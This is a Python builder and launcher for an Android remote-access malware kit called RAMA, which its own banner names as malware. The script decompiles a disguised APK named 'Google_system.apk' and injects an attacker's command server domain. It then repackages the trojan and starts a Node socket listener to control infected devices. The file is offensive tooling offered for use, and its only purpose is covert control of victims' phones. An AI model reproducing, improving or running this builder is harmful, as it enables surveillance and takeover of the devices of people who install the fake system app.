import os
import sys
import argparse
import subprocess
import random
import time
#bannder
time.sleep(2)
#os.system(f"echo 'Remote Access Malware for Android' | pv -qL 10 | lolcat")
fileint=random.randint(0,5)
bannerType=["standard","smslant","smscript","banner","smshadow","big"]
os.system(f"figlet -f {bannerType[fileint]} RAMA | lolcat -a -d 2")
time.sleep(2)
os.system(f"echo 'Remote Access Malware for Android' | pv -qL 10 | lolcat")
print("\n")
time.sleep(1)
print("\033[93mCREATE BY HUI HOLA\033[0m")
print("\n")
time.sleep(2)
#banner done

#command lin utiliy
commandLine=argparse.ArgumentParser(description = "Welcome to Rama help") #it like create object

#command first
commandLine.add_argument("-b","--build",type=str,help=" -b <true> build maleware app")
commandLine.add_argument("-i","--host",type=str,help="<https> server domain to connect app \n WORING: don't use tcp it take http server domain")
commandLine.add_argument("-l","--listen",type=int,help="<port> where http server is running")
commandLine.add_argument("-o","--output",type=str,default="RAMAapp.apk",help="<filename> save build app as filename")

getCommand=commandLine.parse_args()

def check():
    try:
        subprocess.getoutput("apktool -v")
        return True
    except FileNotFoundError as e:
        return False
        print("\033[91mapktool is not installed\033[0m")
def builder():
    if(check):
        os.system("apktool d src/app/Google_system.apk")
        if(getCommand.host):
            with open("Google_system/assets/ip.txt",'a') as ip:
                ip.write(getCommand.host)
                ip.close()
            if(getCommand.output):
                os.system("apktool b Google_system -o " + getCommand.output)
                os.system("rm -rf Google_system")
        else:
            os.system("\033[91m arguments error plese read help\033[0m")
        print("\033[93m[INFO] maybe your system throw error in install time so please decompile Google_system.apk with any apk Editor and go to assets/ip.txt and put your domain")



def listen():
    port=getCommand.listen
    path=subprocess.getoutput("pwd")
    # os.system('''echo "START LISTINING ...." | lolcat -d 400''')
    print("\n")
    os.system(f"node {path}/Server/socket.js {port}")
if(getCommand.listen):
    listen()
elif(getCommand.build):
    builder()

